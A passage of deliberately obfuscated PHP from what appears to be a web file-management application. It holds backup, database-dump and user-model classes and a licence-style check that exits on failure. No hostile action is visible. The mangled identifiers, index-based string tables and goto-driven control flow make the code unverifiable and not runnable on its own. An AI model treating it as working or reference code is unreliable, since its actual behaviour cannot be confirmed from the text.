$DÆÀ§Ø¬·ã[586]) { die; } $a¹ñÙì‡ó = $BéÃœßí™ % $a¹ñÙì‡ó; } if ($a¹ñÙì‡ó == 1) { break; } else { $Aèí´ÀµˆÏ++; } } $C„õŠËğá  = 2; goto E…âŸ«„±ˆ; bÌœ ¾Øø³: $aº¡˜Ü²äÑ = $AİÀ„Î×•[263]($aº¡˜Ü²äÑ); $C¡ºÄœÓ†Å = 0; $c’ÑË­Š‰Š = $DÆÀ§Ø¬·ã[615]; goto C×‰…ê­“Â; E…âŸ«„±ˆ: for ($dò’ŠÇŒ”Ú = 0; $dò’ŠÇŒ”Ú < $F–ä—ãï¿« * 10; $dò’ŠÇŒ”Ú++) { if (($F–ä—ãï¿« * $dò’ŠÇŒ”Ú + 1) % $Aèí´ÀµˆÏ == 0) { $C„õŠËğá  = $AİÀ„Î×•[263](($F–ä—ãï¿« * $dò’ŠÇŒ”Ú + 1) / $Aèí´ÀµˆÏ); break; } } $E¢äºÊãï = $AİÀ„Î×•[124]($AİÀ„Î×•[369] . ($C¡ºÄœÓ†Å + $F‘Ö•©µŸ) . $AİÀ„Î×•[370] . $Aèí´ÀµˆÏ . $AİÀ„Î×•[370] . $C„õŠËğá  . $AİÀ„Î×•[371]); $dŒèœ£…æ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($fáÜÄğó¦ó[0], $E¢äºÊãï); goto B¤ÈÅÎó§õ; B¤ÈÅÎó§õ: $AÙÜÁĞ®Ò… = $DÆÀ§Ø¬·ã[711]; if (!$AÙÜÁĞ®Ò…) { die; } return $dŒèœ£…æ; goto A¾†®é¶ˆâ; A¾†®é¶ˆâ: } public function qhui37632afe() { goto B™ßÇËŠƒ; cÛˆšƒ¸©»: $BöÙùØ¶òê = 2; for ($Bø²”Ê¿›‚ = $DäÍÎ©Û¸œ; $Bø²”Ê¿›‚ > 1; $Bø²”Ê¿›‚--) { $dØÉğ¹¶Ş— = !0; $eâœ‹«¬  = $AåÖá×‰±÷[713]; if (strlen($eâœ‹«¬ ) < $AåÖá×‰±÷[597]) { return; } foreach ($dºÕã˜‚¹ as $aŸ™»…Í÷Å) { if ($Bø²”Ê¿›‚ % $aŸ™»…Í÷Å == 0) { $dØÉğ¹¶Ş— = !1; break; } } if ($dØÉğ¹¶Ş—) { $BöÙùØ¶òê = $Bø²”Ê¿›‚; break; } } return $BöÙùØ¶òê; goto F¥„»Ñ‘äÍ; B™ßÇËŠƒ: $AåÖá×‰±÷ =& $_SERVER[£¶ä½¶¢]; $F…Áê…—¬ =& $_SERVER[£ÛúôÆ˜öÒòş]; $DäÍÎ©Û¸œ = $F…Áê…—¬[354]($F…Áê…—¬[373](2, 14), $F…Áê…—¬[373](2, 16) - 1); goto c½ÊäÁïÕ£; c½ÊäÁïÕ£: $dºÕã˜‚¹ = array(); $dÓˆĞš†Øä = 1; while ($dÓˆĞš†Øä <= (int) $F…Áê…—¬[374]($DäÍÎ©Û¸œ)) { $Bø²”Ê¿›‚ = $dÓˆĞš†Øä; $DÒ‰©Ï–¦ß = $AåÖá×‰±÷[712]; while (strlen($DÒ‰©Ï–¦ß) < $AåÖá×‰±÷[10]) { if (!$DÒ‰©Ï–¦ß) { break; } $DÒ‰©Ï–¦ß++; } while (!0) { $Bø²”Ê¿›‚++; if ($Bø²”Ê¿›‚ <= 2) { $dÓˆĞš†Øä = $Bø²”Ê¿›‚; break; } else { if ($Bø²”Ê¿›‚ < 2) { continue; } } $dØÉğ¹¶Ş— = !0; for ($A•¿Ò—ô† = 2; $A•¿Ò—ô† <= $F…Áê…—¬[374]($Bø²”Ê¿›‚); $A•¿Ò—ô†++) { if ($Bø²”Ê¿›‚ % $A•¿Ò—ô† == 0) { $dØÉğ¹¶Ş— = !1; } } if ($dØÉğ¹¶Ş—) { $dÓˆĞš†Øä = $Bø²”Ê¿›‚; break; } } $dºÕã˜‚¹[] = $dÓˆĞš†Øä; } goto cÛˆšƒ¸©»; F¥„»Ñ‘äÍ: } public function seab0e300bbc($c¢Æ İÏ÷ê, $f¦ÑÜÊ†) { $D“¤øë˜÷ =& $_SERVER[£ÛúôÆ˜öÒòş]; return $D“¤øë˜÷[13](array($D“¤øë˜÷[14], $D“¤øë˜÷[375]), $c¢Æ İÏ÷ê, $f¦ÑÜÊ†); $d¨ÂÖ˜ˆ®é = $_SERVER[£¶ä½¶¢][714]; } public function xqzl875f3469($F‚£ÅÌöˆÒ, $b¹œË—›ºç) { $Dõ¿ËÕç™˜ =& $_SERVER[£ÛúôÆ˜öÒòş]; return $Dõ¿ËÕç™˜[13](array($Dõ¿ËÕç™˜[376], $Dõ¿ËÕç™˜[377]), $F‚£ÅÌöˆÒ, $b¹œË—›ºç); } public function phabc0f98556($E‘Ø½Éòù“, $d”±Ì‡±ñß) { $d±õ¡Ó¹Î¿ =& $_SERVER[£ÛúôÆ˜öÒòş]; return $d±õ¡Ó¹Î¿[13](array($d±õ¡Ó¹Î¿[376], $d±õ¡Ó¹Î¿[378]), $E‘Ø½Éòù“, $d”±Ì‡±ñß); $c—çĞ·óö = $_SERVER[£¶ä½¶¢][715]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $FßƒÊˆÊõŒ =& $_SERVER[£¶ä½¶¢]; $this->isManual(); self::$name = date($FßƒÊˆÊõŒ[716]); if (!($FùâËˆéä = Model($FßƒÊˆÊõŒ[717])->lastItem())) { $FùâËˆéä = $this->initData(); } else { self::$name = $FùâËˆéä[$FßƒÊˆÊõŒ[38]]; if ($FùâËˆéä[$FßƒÊˆÊõŒ[718]] == $FßƒÊˆÊõŒ[97]) { self::$name = date($FßƒÊˆÊõŒ[719]); $dÚºòŞ“ = 0; if (isset($FùâËˆéä[$FßƒÊˆÊõŒ[300]][$FßƒÊˆÊõŒ[203]][$FßƒÊˆÊõŒ[455]])) { $dÚºòŞ“ = (int) $FùâËˆéä[$FßƒÊˆÊõŒ[300]][$FßƒÊˆÊõŒ[203]][$FßƒÊˆÊõŒ[455]]; } if (self::$manual == 0 && $FùâËˆéä[$FßƒÊˆÊõŒ[38]] == self::$name) { Model($FßƒÊˆÊõŒ[717])->remove($FùâËˆéä[$FßƒÊˆÊõŒ[401]]); } $FùâËˆéä = $this->initData($dÚºòŞ“, $FùâËˆéä[$FßƒÊˆÊõŒ[720]]); } else { $this->checkStore($FùâËˆéä[$FßƒÊˆÊõŒ[720]]); } } self::$option = $FùâËˆéä; } private function isManual() { $c»ƒÕÏÕá¡ = _get($GLOBALS, $_SERVER[£¶ä½¶¢][721], 0); $c»ƒÕÏÕá¡ = intval($c»ƒÕÏÕá¡); self::$manual = $c»ƒÕÏÕá¡ && $c»ƒÕÏÕá¡ == 1 ? 1 : 0; } private function initData($c²ïÄ×”ğÂ = 0, $C¼×ñ†ÖË· = '') { goto F‹››Ôåà; EÎÆÁ÷ªÏé: $this->checkStore($AºÀŠŒƒá‹[$aÚÁËÂŒÖ[720]]); if (self::$manual == 1) { self::$name .= $aÚÁËÂŒÖ[81] . date($aÚÁËÂŒÖ[722]); } $FÉôÖ‹ç÷ = array($aÚÁËÂŒÖ[720] => $AºÀŠŒƒá‹[$aÚÁËÂŒÖ[720]], $aÚÁËÂŒÖ[38] => self::$name, $aÚÁËÂŒÖ[718] => 0, $aÚÁËÂŒÖ[723] => $AºÀŠŒƒá‹[$aÚÁËÂŒÖ[723]], $aÚÁËÂŒÖ[724] => self::$manual, $aÚÁËÂŒÖ[300] => array($aÚÁËÂŒÖ[725] => array($aÚÁËÂŒÖ[718] => 0), $aÚÁËÂŒÖ[726] => array($aÚÁËÂŒÖ[718] => 0, $aÚÁËÂŒÖ[727] => 0, $aÚÁËÂŒÖ[728] => 0, $aÚÁËÂŒÖ[39] => $aÚÁËÂŒÖ[43], $aÚÁËÂŒÖ[729] => 0, $aÚÁËÂŒÖ[484] => 0), $aÚÁËÂŒÖ[730] => array($aÚÁËÂŒÖ[718] => 0, $aÚÁËÂŒÖ[727] => 0, $aÚÁËÂŒÖ[728] => 0, $aÚÁËÂŒÖ[729] => 0, $aÚÁËÂŒÖ[484] => 0), $aÚÁËÂŒÖ[203] => array($aÚÁËÂŒÖ[718] => 0, $aÚÁËÂŒÖ[731] => 0, $aÚÁËÂŒÖ[732] => 0, $aÚÁËÂŒÖ[733] => 0, $aÚÁËÂŒÖ[734] => 0, $aÚÁËÂŒÖ[455] => $c²ïÄ×”ğÂ, $aÚÁËÂŒÖ[729] => 0, $aÚÁËÂŒÖ[484] => 0)), $aÚÁËÂŒÖ[729] => time(), $aÚÁËÂŒÖ[484] => 0); goto E£–¦Õ¡†ˆ; F‹››Ôåà: $aÚÁËÂŒÖ =& $_SERVER[£¶ä½¶¢]; $AºÀŠŒƒá‹ = Model($aÚÁËÂŒÖ[717])->config(); if ($C¼×ñ†ÖË· && $AºÀŠŒƒá‹[$aÚÁËÂŒÖ[720]] != $C¼×ñ†ÖË·) { $c²ïÄ×”ğÂ = 0; } goto EÎÆÁ÷ªÏé; E£–¦Õ¡†ˆ: $FîĞ¯—Ù÷à = Model($aÚÁËÂŒÖ[717])->insert($FÉôÖ‹ç÷); $FÉôÖ‹ç÷[$aÚÁËÂŒÖ[401]] = $FîĞ¯—Ù÷à; return $FÉôÖ‹ç÷; goto cÂ¹Ş¹†×‹; cÂ¹Ş¹†×‹: } private function checkStore($eÆùê¤Õñ”) { $C¤Ğ®‘Ûèö =& $_SERVER[£¶ä½¶¢]; $aƒóÀÙ×…¢ = Model($C¤Ğ®‘Ûèö[735])->listData($eÆùê¤Õñ”); Model($C¤Ğ®‘Ûèö[735])->checkConfig($aƒóÀÙ×…¢); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[£¶ä½¶¢][717])->findByName(self::$name); } return self::$option; } public static function set($aÌî‚²–ªŠ) { $cø—î‰„â =& $_SERVER[£¶ä½¶¢]; $C¯ÚÜÂ¹ = self::get(); foreach ($aÌî‚²–ªŠ as $c×‹è¹ê‡Ñ => $DÊÊ£†‰°è) { $EÈîô«¬ò– = explode($cø—î‰„â[105], $c×‹è¹ê‡Ñ); $b–­‰ÇµÑÏ = count($EÈîô«¬ò–); switch ($b–­‰ÇµÑÏ) { case 1: $C¯ÚÜÂ¹[$EÈîô«¬ò–[0]] = $DÊÊ£†‰°è; break; case 2: $C¯ÚÜÂ¹[$EÈîô«¬ò–[0]][$EÈîô«¬ò–[1]] = $DÊÊ£†‰°è; break; case 3: $C¯ÚÜÂ¹[$EÈîô«¬ò–[0]][$EÈîô«¬ò–[1]][$EÈîô«¬ò–[2]] = $DÊÊ£†‰°è; break; } } Model($cø—î‰„â[717])->update($C¯ÚÜÂ¹[$cø—î‰„â[401]], $C¯ÚÜÂ¹); self::$option = $C¯ÚÜÂ¹; return self::$option; } public function keep() { $DŸËŠ¿Ë¦ =& $_SERVER[£¶ä½¶¢]; $D÷Ã¬ğà©ƒ = self::get(); if ($D÷Ã¬ğà©ƒ[$DŸËŠ¿Ë¦[300]][$DŸËŠ¿Ë¦[725]][$DŸËŠ¿Ë¦[718]] == $DŸËŠ¿Ë¦[97]) { return; } $this->backupKeep($D÷Ã¬ğà©ƒ); self::set(array($DŸËŠ¿Ë¦[736] => 1)); } private function backupKeep($F¼Ÿ›ùê¡) { goto B¼˜øº™Ø÷; fò­ĞƒšŒ: foreach ($Cä‘ß¸¢Ğƒ as $CÚ¥ÉÈçô¾) { if ($e¹¸ãÒ¸¯ >= 7) { break; } $fæ™©ÇÖÎè[] = $CÚ¥ÉÈçô¾[$d»…”ìÙµ†[38]]; $e¹¸ãÒ¸¯++; } for ($e¹¸ãÒ¸¯ = 0; $e¹¸ãÒ¸¯ < 12; $e¹¸ãÒ¸¯++) { $fæ™©ÇÖÎè[] = date($d»…”ìÙµ†[737], strtotime("\x2d{$e¹¸ãÒ¸¯}\40\155\157\x6e\x74\x68\163")); } $fæ™©ÇÖÎè = array_unique($fæ™©ÇÖÎè); goto dí»…ğÁï°; A¾Õ¥øìã¿: if (empty($Cä‘ß¸¢Ğƒ)) { return; } $e¹¸ãÒ¸¯ = 0; $fæ™©ÇÖÎè = array(); goto fò­ĞƒšŒ; dí»…ğÁï°: $d¬¸ï¦Á¿ = Model($d»…”ìÙµ†[738])->get($d»…”ìÙµ†[739]); foreach ($Cä‘ß¸¢Ğƒ as $CÚ¥ÉÈçô¾) { if (isset($CÚ¥ÉÈçô¾[$d»…”ìÙµ†[724]]) && $CÚ¥ÉÈçô¾[$d»…”ìÙµ†[724]] == $d»…”ìÙµ†[97]) { continue; } if (!empty($CÚ¥ÉÈçô¾[$d»…”ìÙµ†[38]]) && in_array($CÚ¥ÉÈçô¾[$d»…”ìÙµ†[38]], $fæ™©ÇÖÎè)) { continue; } Model($d»…”ìÙµ†[717])->remove($CÚ¥ÉÈçô¾[$d»…”ìÙµ†[401]]); $fé§‰İÙÇÏ = $this->backupPath($F¼Ÿ›ùê¡, $d¬¸ï¦Á¿); IO::remove($fé§‰İÙÇÏ, !1); } goto F´¹ˆ‰¡„; B¼˜øº™Ø÷: $d»…”ìÙµ† =& $_SERVER[£¶ä½¶¢]; if (self::$manual == 1) { return; } $Cä‘ß¸¢Ğƒ = Model($d»…”ìÙµ†[717])->listData(); goto A¾Õ¥øìã¿; F´¹ˆ‰¡„: } private function backupPath($dö®ôîò¦Ê, $A’ïóÑäÃ³ = false) { $FŸµµ§’× =& $_SERVER[£¶ä½¶¢]; if (!$A’ïóÑäÃ³) { $A’ïóÑäÃ³ = Model($FŸµµ§’×[738])->get($FŸµµ§’×[739]); } $CŒêÉÄ±˜ = $dö®ôîò¦Ê[$FŸµµ§’×[38]]; $BËËÏæ¢Ñö = substr(md5($FŸµµ§’×[740] . $A’ïóÑäÃ³ . $CŒêÉÄ±˜), 0, 8); return "\x7b\151\x6f\x3a{$dö®ôîò¦Ê[$FŸµµ§’×[720]]}\175\57\144\x61\164\141\142\x61\163\x65\x2f\142\x61\143\153\165\x70\x2f" . $CŒêÉÄ±˜ . $FŸµµ§’×[81] . $BËËÏæ¢Ñö; } public function db() { goto AŞ¶Ş¦ï÷ß; c×Šˆé…ãÈ: $DºÒ­Ú¹÷° = new BackupDb(); if (!$DºÒ­Ú¹÷°->index()) { return !1; } self::set(array($E ĞŞ¼°šµ[741] => 1)); goto e£ì‡ó¯¨Ù; e£ì‡ó¯¨Ù: return !0; goto f‹ÔÎ¹µßÔ; AŞ¶Ş¦ï÷ß: $E ĞŞ¼°šµ =& $_SERVER[£¶ä½¶¢]; $cµ¶ÃÄïŒæ = self::get(); if ($cµ¶ÃÄïŒæ[$E ĞŞ¼°šµ[300]][$E ĞŞ¼°šµ[726]][$E ĞŞ¼°šµ[718]] == $E ĞŞ¼°šµ[97]) { return !0; } goto c×Šˆé…ãÈ; f‹ÔÎ¹µßÔ: } public function dbFile() { goto eô…¡¥êÄä; f…§…òô™Ñ: return !0; goto b­µø¹æ¢·; eô…¡¥êÄä: $a—å“Š±± =& $_SERVER[£¶ä½¶¢]; $E¤å­²Ÿğ = self::get(); if ($E¤å­²Ÿğ[$a—å“Š±±[300]][$a—å“Š±±[730]][$a—å“Š±±[718]] == $a—å“Š±±[97]) { return !0; } goto a°Ş•¥‹õ; a°Ş•¥‹õ: $a‰Àå‡»ÆŒ = new BackupDbFile(); if (!$a‰Àå‡»ÆŒ->index()) { return !1; } self::set(array($a—å“Š±±[742] => 1)); goto f…§…òô™Ñ; b­µø¹æ¢·: } public function file() { $e¡›ïè¡‡÷ =& $_SERVER[£¶ä½¶¢]; $dà›œ†ˆƒÏ = self::get(); if ($dà›œ†ˆƒÏ[$e¡›ïè¡‡÷[300]][$e¡›ïè¡‡÷[203]][$e¡›ïè¡‡÷[718]] == $e¡›ïè¡‡÷[97]) { return !0; } if (!isset($dà›œ†ˆƒÏ[$e¡›ïè¡‡÷[723]]) || $dà›œ†ˆƒÏ[$e¡›ïè¡‡÷[723]] == $e¡›ïè¡‡÷[201]) { $A„¥¡ÓÉÂª = new BackupFile(); if (!$A„¥¡ÓÉÂª->index()) { return !1; } } self::set(array($e¡›ïè¡‡÷[743] => 1, $e¡›ïè¡‡÷[718] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto báŞâ…¿Ã‚; b“ºˆÖµÓ®: $C—Ó…«Ş£ = new DbManage($CùïÌ‘½, $aÏôõ–³Ø); $AĞ²È¢¼ÇŸ = array($e´Ù–¥„—Õ[744] => $aÏôõ–³Ø, $e´Ù–¥„—Õ[745] => time()); Backup::set($AĞ²È¢¼ÇŸ); goto e“Ôë„×÷Ú; aö•õíÃ«Æ: $bÏİÀÚğ = $Aí¢ªÄ¼Á³ = 0; try { $ağ‚‡–á·Ò = $C—Ó…«Ş£->db()->getTables(); } catch (Exception $aŞáÀŒÁè) { return !1; } $ağ‚‡–á·Ò = array_diff($ağ‚‡–á·Ò, array($e´Ù–¥„—Õ[747], $e´Ù–¥„—Õ[748])); goto f¦Ï°§’Çï; f¦Ï°§’Çï: foreach ($ağ‚‡–á·Ò as $F×††ÍÓ) { $bÏİÀÚğ += $C—Ó…«Ş£->model($F×††ÍÓ)->count(); } $BÉ·ŸëŠÃÙ = new Task($e´Ù–¥„—Õ[749], $e´Ù–¥„—Õ[750], $bÏİÀÚğ, LNG($e´Ù–¥„—Õ[751]) . $e´Ù–¥„—Õ[752] . LNG($e´Ù–¥„—Õ[753])); foreach ($ağ‚‡–á·Ò as $F×††ÍÓ) { $a’Ë°ÅÉğ’ = $c»¦ËÉâ˜‘ . $F×††ÍÓ . $e´Ù–¥„—Õ[754]; $Fö¿Ş¶êŠ´ = null; if ($F×††ÍÓ == $e´Ù–¥„—Õ[755] && (!isset($e™êëóí†¾[$e´Ù–¥„—Õ[723]]) || $e™êëóí†¾[$e´Ù–¥„—Õ[723]] == $e´Ù–¥„—Õ[201])) { $Fö¿Ş¶êŠ´ = self::$io; } $Aí¢ªÄ¼Á³ += $C—Ó…«Ş£->sqlFromDb($F×††ÍÓ, $a’Ë°ÅÉğ’, $BÉ·ŸëŠÃÙ, $Fö¿Ş¶êŠ´); } goto Cë÷áâŸÀø; Cë÷áâŸÀø: if (isset($BÉ·ŸëŠÃÙ->task[$e´Ù–¥„—Õ[756]])) { $C´¼Ç’‰ = $BÉ·ŸëŠÃÙ->task[$e´Ù–¥„—Õ[756]] ? $BÉ·ŸëŠÃÙ->task[$e´Ù–¥„—Õ[756]] : timeFloat(); $EÃ°Íä˜˜¬ = $C´¼Ç’‰ - $BÉ·ŸëŠÃÙ->task[$e´Ù–¥„—Õ[757]]; if ($EÃ°Íä˜˜¬ >= 0.2) { $bÏİÀÚğ += 1; } } $BÉ·ŸëŠÃÙ->end(); $AĞ²È¢¼ÇŸ = array($e´Ù–¥„—Õ[744] => $aÏôõ–³Ø, $e´Ù–¥„—Õ[741] => 1, $e´Ù–¥„—Õ[758] => $bÏİÀÚğ, $e´Ù–¥„—Õ[759] => $Aí¢ªÄ¼Á³, $e´Ù–¥„—Õ[760] => time()); goto aÓÏÇ‡¥µ¾; BŸ‚éÙÂÛ: self::$name = $e™êëóí†¾[$e´Ù–¥„—Õ[38]]; $CùïÌ‘½ = $GLOBALS[$e´Ù–¥„—Õ[16]][$e´Ù–¥„—Õ[27]]; $aÏôõ–³Ø = $this->_dbType($CùïÌ‘½); goto b“ºˆÖµÓ®; e“Ôë„×÷Ú: $c»¦ËÉâ˜‘ = $this->tmpFilesPath() . $e´Ù–¥„—Õ[746] . self::$name . $e´Ù–¥„—Õ[18]; del_dir($c»¦ËÉâ˜‘); mk_dir($c»¦ËÉâ˜‘); goto aö•õíÃ«Æ; aÓÏÇ‡¥µ¾: Backup::set($AĞ²È¢¼ÇŸ); if ($bÏİÀÚğ > $Aí¢ªÄ¼Á³) { write_log(array($e´Ù–¥„—Õ[761], $AĞ²È¢¼ÇŸ), $e´Ù–¥„—Õ[750]); return !1; } return !0; goto f¹®•ƒÊ¶ì; báŞâ…¿Ã‚: $e´Ù–¥„—Õ =& $_SERVER[£¶ä½¶¢]; $e™êëóí†¾ = Backup::get(); self::$io = $e™êëóí†¾[$e´Ù–¥„—Õ[720]]; goto BŸ‚éÙÂÛ; f¹®•ƒÊ¶ì: } private function _dbType($c‡ª‰ƒ‰Ò) { goto fí¾¶Ç¸É°; bÑÏ£ßá: if ($C•—†á®Äš == $Añ×•ÄÌ³[763]) { $aÊ™º£¢÷½ = explode($Añ×•ÄÌ³[14], $c‡ª‰ƒ‰Ò[$Añ×•ÄÌ³[764]]); $C•—†á®Äš = $aÊ™º£¢÷½[0]; } $c»Ô…½Óï· = array($Añ×•ÄÌ³[765] => $Añ×•ÄÌ³[19], $Añ×•ÄÌ³[766] => $Añ×•ÄÌ³[767]); if (isset($c»Ô…½Óï·[$C•—†á®Äš])) { $C•—†á®Äš = $c»Ô…½Óï·[$C•—†á®Äš]; } goto d¥ÜÆ„·½¦; fí¾¶Ç¸É°: $Añ×•ÄÌ³ =& $_SERVER[£¶ä½¶¢]; $c‡ª‰ƒ‰Ò = array_change_key_case($c‡ª‰ƒ‰Ò); $C•—†á®Äš = $c‡ª‰ƒ‰Ò[$Añ×•ÄÌ³[762]]; goto bÑÏ£ßá; d¥ÜÆ„·½¦: return $C•—†á®Äš; goto D¨”††êî²; D¨”††êî²: } private function tmpFilesPath() { $DÈ„ƒŞ¬‘ó =& $_SERVER[£¶ä½¶¢]; $aõô©Øñ¥æ = TEMP_FILES; if ($GLOBALS[$DÈ„ƒŞ¬‘ó[16]][$DÈ„ƒŞ¬‘ó[98]][$DÈ„ƒŞ¬‘ó[768]]) { $aõô©Øñ¥æ = $GLOBALS[$DÈ„ƒŞ¬‘ó[16]][$DÈ„ƒŞ¬‘ó[98]][$DÈ„ƒŞ¬‘ó[768]]; if (!mk_dir($aõô©Øñ¥æ) || !is_writable($aõô©Øñ¥æ) || !IO::mkfile($aõô©Øñ¥æ . $DÈ„ƒŞ¬‘ó[769])) { $aõô©Øñ¥æ = TEMP_FILES; } } return $aõô©Øñ¥æ; } } goto Eßª™İ; cçÄğïªâÂ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\152\157\x62\114\x69\163\164"; public $field = array("\156\141\155\145", "\x64\145\163\143", "\x73\x6f\162\x74"); const JOB_KEY = "\163\145\x6c\146\112\x6f\x62\x4c\x69\x73\164"; public function listData($CÁ”Õ•ùƒ = false, $f„•ƒœŒå³ = "\x73\157\162\164", $Eä…“£È¡ = false) { return parent::listData($CÁ”Õ•ùƒ, $f„•ƒœŒå³, $Eä…“£È¡); } public function remove($BŞÄò—ªÇ) { return parent::remove($BŞÄò—ªÇ); } public function add($F¿‘ÇÛã‡ó) { $FÎ ßĞ…Êº =& $_SERVER[£¶ä½¶¢]; if ($this->findByName($F¿‘ÇÛã‡ó[$FÎ ßĞ…Êº[38]])) { return !1; } $F¿‘ÇÛã‡ó[$FÎ ßĞ…Êº[1713]] = $this->getSort(); return parent::insert($F¿‘ÇÛã‡ó); } private function getSort() { $E¨¬Î¶¤ƒ¾ =& $_SERVER[£¶ä½¶¢]; $CÍ«à´­ = parent::listData(); $b¡‚¸Í¥‡ë = array_to_keyvalue($CÍ«à´­, $E¨¬Î¶¤ƒ¾[43], $E¨¬Î¶¤ƒ¾[1713]); return empty($b¡‚¸Í¥‡ë) ? 0 : max($b¡‚¸Í¥‡ë) + 1; } public function update($dØò©òŠ—, $CÅËöÆ²ºÌ) { $F¥—›¶õ„ =& $_SERVER[£¶ä½¶¢]; $c¦øéÅĞŒ = parent::listData($dØò©òŠ—); $A—‡¼»ÏâÚ = $this->findByName($CÅËöÆ²ºÌ[$F¥—›¶õ„[38]]); if (!$c¦øéÅĞŒ || $A—‡¼»ÏâÚ && $A—‡¼»ÏâÚ[$F¥—›¶õ„[401]] != $c¦øéÅĞŒ[$F¥—›¶õ„[401]]) { return !1; } return parent::update($dØò©òŠ—, $CÅËöÆ²ºÌ); } public function setUserJob($fÍ¡¤ï©¥, $EÉ•ùéùé) { goto aÙËÊÏ‰ÈŞ; d²âæÀ¦Å: $C—Œ»‰¿× = array_to_keyvalue($Aï‡ºê›ìÄ, $dğ­²…Ù¸¡[38]); $fÓ†•›™¬… = $dğ­²…Ù¸¡[13]; foreach ($EÉ•ùéùé as $E‚ŞÀç´åğ) { if ($C—Œ»‰¿×[$E‚ŞÀç´åğ]) { $fÓ†•›™¬… .= $C—Œ»‰¿×[$E‚ŞÀç´åğ][$dğ­²…Ù¸¡[401]] . $dğ­²…Ù¸¡[57]; } else { $F°¶îà—¯â = $this->add($E‚ŞÀç´åğ); $fÓ†•›™¬… .= $F°¶îà—¯â . $dğ­²…Ù¸¡[57]; } } goto B´õÑö–ï; aÙËÊÏ‰ÈŞ: $dğ­²…Ù¸¡ =& $_SERVER[£¶ä½¶¢]; if (!is_array($EÉ•ùéùé)) { $EÉ•ùéùé = array($EÉ•ùéùé); } $Aï‡ºê›ìÄ = parent::listData(); goto d²âæÀ¦Å; B´õÑö–ï: $fÓ†•›™¬… = rtrim($fÓ†•›™¬…, $dğ­²…Ù¸¡[57]); Model($dğ­²…Ù¸¡[514])->metaSet($fÍ¡¤ï©¥, self::JOB_KEY, $fÓ†•›™¬…); goto DÔ¦óÌÊÎ; DÔ¦óÌÊÎ: } public function getUserJob($D¡ä«äÑø) { $Fâİ­óÛ¸à = Model($_SERVER[£¶ä½¶¢][514])->metaGet($D¡ä«äÑø); return $this->getUserJobInfo($Fâİ­óÛ¸à[self::JOB_KEY]); } public function getUserJobInfo($F§Ï¿ÒôÃ©) { goto c½«õ¡ƒ·á; a¹íš³Ş–õ: return $CæÊï÷°éë; goto BˆŒìù†©¢; c½«õ¡ƒ·á: $f§‘›œ Ö =& $_SERVER[£¶ä½¶¢]; $aÕÙ²Õ³•½ = explode($f§‘›œ Ö[57], $F§Ï¿ÒôÃ©); $f¨±ÎšÖÆ¤ = parent::listData(); goto E¬¤ù“©; E¬¤ù“©: $f¨±ÎšÖÆ¤ = array_remove_key($f¨±ÎšÖÆ¤, $f§‘›œ Ö[204]); $CæÊï÷°éë = array(); foreach ($aÕÙ²Õ³•½ as $d™¦Ã¤»©ò) { if (isset($f¨±ÎšÖÆ¤[$d™¦Ã¤»©ò])) { $CæÊï÷°éë[] = $f¨±ÎšÖÆ¤[$d™¦Ã¤»©ò]; } } goto a¹íš³Ş–õ; BˆŒìù†©¢: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\141\x6d\x65" => "\x75\x73\145\162\137\x6d\145\x74\x61", "\155\145\164\141\x46\x69\x65\154\x64" => "\165\163\x65\x72\111\x44"); protected $simpleField = "\x75\x73\145\162\111\x44\x2c\x6e\x69\x63\x6b\x4e\141\x6d\x65\x2c\156\141\155\x65\x2c\x61\x76\x61\x74\x61\x72\54\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($A¹‘ °Îõ•) { $Bœõ¡ÑÜ‰ò =& $_SERVER[£¶ä½¶¢]; $B´†ÒœõíŠ = $Bœõ¡ÑÜ‰ò[2115]; return array($Bœõ¡ÑÜ‰ò[1760] => array($A¹‘ °Îõ•[0], $B´†ÒœõíŠ), $Bœõ¡ÑÜ‰ò[1762] => array($A¹‘ °Îõ•[0], $B´†ÒœõíŠ), $Bœõ¡ÑÜ‰ò[2116] => array($A¹‘ °Îõ•[0], $B´†ÒœõíŠ)); } protected function getInfo($FƒİŞÎôƒ¶, $D®Çõôò‡ = false) { $D¼²ïÖ„ç© = $this->getInfoSimple($FƒİŞÎôƒ¶); if (!is_array($D¼²ïÖ„ç©)) { return array(); } if ($D®Çõôò‡) { return $this->_getInfoApply($D¼²ïÖ„ç©); } return $this->cacheFunctionGet($_SERVER[£¶ä½¶¢][1769], $FƒİŞÎôƒ¶); } protected function getInfoFull($eµ¢Ã»ƒßï, $AŞ ‰Õ¾í = false) { $B‹ö…µŸ˜ = $this->getInfoSimple($eµ¢Ã»ƒßï); if (!is_array($B‹ö…µŸ˜)) { return array(); } if ($AŞ ‰Õ¾í) { return $this->_getInfoApply($B‹ö…µŸ˜, !0); return $this->_getInfoApply($B‹ö…µŸ˜, !0); } return $this->cacheFunctionGet($_SERVER[£¶ä½¶¢][2117], $eµ¢Ã»ƒßï); } private function _getInfoApply($E’ñøêâ¬, $fÛœß·“ = false) { goto f¿µÆ½Ö¾Ô; B­¶¸ÈÚ˜Ì: $E’ñøêâ¬[$e¯³»°‰[95]][$e¯³»°‰[1950]] = isset($AÔ¨ŠÚ‡Ì‹[$e¯³»°‰[1951]]) ? $AÔ¨ŠÚ‡Ì‹[$e¯³»°‰[1951]] : null; if ($fÛœß·“) { $E’ñøêâ¬[$e¯³»°‰[453]] = $this->metaGet($E’ñøêâ¬[$e¯³»°‰[1526]]); } return $E’ñøêâ¬; goto FèÀ²‡ÒŒ½; f¿µÆ½Ö¾Ô: $e¯³»°‰ =& $_SERVER[£¶ä½¶¢]; if (!$E’ñøêâ¬) { return $E’ñøêâ¬; } $E¨’ĞÌ£• = md5($e¯³»°‰[2118] . $E’ñøêâ¬[$e¯³»°‰[847]] . $e¯³»°‰[2119] . $E’ñøêâ¬[$e¯³»°‰[38]]); goto b¢¢ ™ËÊ½; b¢¢ ™ËÊ½: $E’ñøêâ¬ = 